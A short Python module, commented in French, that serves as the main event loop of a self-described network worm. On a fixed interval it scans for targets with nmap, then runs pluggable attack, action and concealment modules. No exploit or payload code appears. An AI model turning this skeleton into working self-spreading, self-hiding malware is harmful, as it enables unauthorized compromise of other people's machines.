#Imports
from .utils          import endOfProgramm
from .nmap           import nmap
from .actions        import __all__                  as ACTIONS
from .attaques       import __all__                  as ATTAQUES
from .dissimulations import __all__                  as DISSIMULATIONS
from queue           import Queue                    as FIFO
from signal          import signal, SIGTERM
from importlib       import import_module
from time            import sleep

#Classes
class Events():
    """
    Classe repreésentant notre boucle d'éxecution
    """
    def __init__(self):
        """
        Constructeur de la classe
        """
        signal(SIGTERM, endOfProgramm)
        self.isStart           = True
        self.cibles            = {}
        self.logsAction        = FIFO()
        self.logsAttaque       = FIFO()
        self.logsDissimulation = FIFO()
        
    def run(self):
        """
        Méthode principale, permet de lancer la boucle pseudo infinie qui gère notre vers
        """
        self.isStart = True
        self.cibles  = {}
        while self.isStart:
            self.cibles = nmap()

            for attaque in ATTAQUES:
                pkg = import_module(attaque)
                pkg.Attaque(self)

            for action in ACTIONS:
                pkg = import_module(action)
                pkg.Action(self)

            for dissimulation in DISSIMULATIONS:
                pkg = import_module(dissimulation)
                pkg.Dissimulation(self)
            
            sleep(5)

    def stop(self):
        """
        Mets fin à la boucle d'éxecution
        """
        self.isStart = False